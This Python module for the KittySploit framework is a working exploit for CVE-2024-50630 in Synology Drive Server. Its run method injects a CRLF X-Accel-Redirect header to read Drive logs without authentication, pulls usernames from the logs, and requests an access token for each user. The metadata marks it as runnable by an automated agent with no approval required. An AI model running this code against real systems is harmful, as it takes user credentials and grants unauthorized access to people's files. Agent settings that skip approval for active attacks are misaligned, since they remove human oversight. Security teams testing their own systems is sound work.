#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Synology Drive Server unauthenticated access token leak on DSM (Synology-SA-24:21)."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Synology DSM Drive Server - Auth Bypass Token Leak (CVE-2024-50630)',
        'description': (
            'Synology Drive Server on DSM allows unauthenticated attackers to read Drive logs '
            'via RedirectURI and obtain user access tokens via '
            'SYNO.SynologyDrive.Authentication (CVE-2024-50630 / SA-24:21). Also indicates '
            'CVE-2024-50631 (SQLi in sync daemon).'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2024', 'synology', 'dsm', 'drive',
            'auth-bypass', 'exposure', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 4,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.5,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'admin_surface', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/admin/http/synology_cve_2024_50630_token_leak'],
            },
        },
        'references': [
            'https://www.synology.com/en-global/security/advisory/Synology_SA_24_21',
            'https://www.zerodayinitiative.com/advisories/ZDI-25-212/',
            'https://nvd.nist.gov/vuln/detail/CVE-2024-50630',
        ],
        'cve': 'CVE-2024-50630',
    }

    def run(self):
        path = '/webapi/entry.cgi'
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        data = (
            'api=SYNO.API.Auth.RedirectURI&version=1&method=run&session=finder&redirect_url='
            'https://dsfinder.synology.com/dsm/login?\r\n'
            'X-Accel-Redirect:/volume1/@synologydrive/log/cloud-workerd.log'
        )
        r = self.http_request(
            method='POST', path=path, data=data, headers=headers, allow_redirects=False,
        )
        if not r or r.status_code != 200:
            return False
        body = r.text or ''
        log_marker = re.search(
            r'^[0-9A-Z:-]+ \([0-9]+:[0-9]+\) \[INFO\].+\.(o|cpp)',
            body,
            re.MULTILINE,
        )
        if not (
            'checkpoint-task.cpp.o' in body
            or 'job-queue-client.cpp.o' in body
            or log_marker
        ):
            return False

        users = set()
        for m in re.finditer(r'"/homes/([^"]+)"', body):
            users.add(m.group(1))
        for m in re.finditer(r'username:([^\r\n]+)', body):
            users.add(m.group(1).strip())
        if not users:
            return False

        tokens = {}
        for user in sorted(users):
            auth_data = (
                'api=SYNO.SynologyDrive.Authentication&method=authenticate&version=1'
                f'&username={user}&device_name=kittysploit'
            )
            ar = self.http_request(
                method='POST', path=path, data=auth_data, headers=headers, allow_redirects=False,
            )
            if not ar or ar.status_code != 200:
                continue
            tm = re.search(r'"access_token"\s*:\s*"([^"]+)"', ar.text or '')
            if tm:
                tokens[user] = tm.group(1)

        if not tokens:
            return False

        self.set_info(
            severity='critical',
            reason=f'Synology Drive CVE-2024-50630 token leak ({len(tokens)} user(s))',
            path=path,
            users=list(tokens.keys()),
        )
        return True
